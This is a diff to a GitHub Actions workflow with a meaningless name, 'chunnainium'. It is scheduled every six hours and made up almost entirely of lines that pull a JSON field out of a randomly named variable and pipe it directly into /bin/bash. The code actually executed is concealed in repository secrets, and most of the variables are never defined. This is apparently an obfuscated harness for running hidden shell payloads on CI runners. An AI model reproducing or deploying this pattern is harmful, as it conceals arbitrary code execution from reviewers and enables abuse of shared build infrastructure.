@@ -3,21 +3,24 @@ name: chunnainium
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
-
-jobs:  # 15912
+    - cron: '12 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chunnainium
         env:
-          bbdq3: ${{ secrets.bbdq3 }}
+          hbyg6142: ${{ secrets.hbyg6142 }}
         run: |
-          echo $bbdq3 | jq -r .el1 | /bin/bash
-          echo $ls6 | jq -r .lhl54675 | /bin/bash
-          echo $rytq254 | jq -r .i25896 | /bin/bash
-          echo $duqyc8532 | jq -r .uh537 | /bin/bash
-          echo $mxsw01331 | jq -r .yl0001 | /bin/bash
+          echo $hbyg6142 | jq -r .an81125 | /bin/bash
+          echo $rreg2573 | jq -r .lb040 | /bin/bash
+          echo $ty582 | jq -r .gt4 | /bin/bash
+          echo $nz6 | jq -r .fj977 | /bin/bash
+          echo $mrfcj5 | jq -r .s56912 | /bin/bash
+          echo $iiq48 | jq -r .dryih87439 | /bin/bash
+          echo $caxfa1 | jq -r .kjlx725 | /bin/bash
+          echo $vin5 | jq -r .ryr36 | /bin/bash
+          echo $bbxme7 | jq -r .qubzh9 | /bin/bash
+          echo $jzytu30213 | jq -r .byq17982 | /bin/bash
 
